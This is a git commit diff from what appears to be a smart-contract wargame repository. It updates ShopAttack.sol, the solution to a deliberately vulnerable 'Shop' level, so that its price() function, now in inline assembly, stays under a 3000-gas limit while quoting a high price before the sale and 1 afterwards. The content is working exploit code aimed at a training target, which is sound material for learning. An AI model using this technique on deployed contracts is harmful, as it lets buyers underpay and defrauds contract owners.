ea804a1544d7bf1860f89db35093271c8f5f940e
emil <33105890+poolsar42@users.noreply.github.com>
2021-12-22 14:22:45 +0300

    Updates price() method in attack contract
    3000 gas is not enough to perform previous implementation
    Currently somehow there are 3000 gas limit, not 3300

--- contracts/contracts/attacks/ShopAttack.sol
+++ contracts/contracts/attacks/ShopAttack.sol
@@ -7,7 +7,21 @@ import '../levels/Shop.sol';
 contract ShopAttack {
 
   function price() external view returns (uint) {
-    return Shop(msg.sender).isSold() ? 1 : 100;
+    bool isSold = Shop(msg.sender).isSold();
+
+    assembly {
+        let result
+
+        switch isSold
+        case 0 {
+            result := 200
+        }
+        default {
+            result := 1
+        }
+        mstore(0x00, result)
+        return(0x00, 0x20)
+    }
   }
 
   function attack(Shop _victim) external {
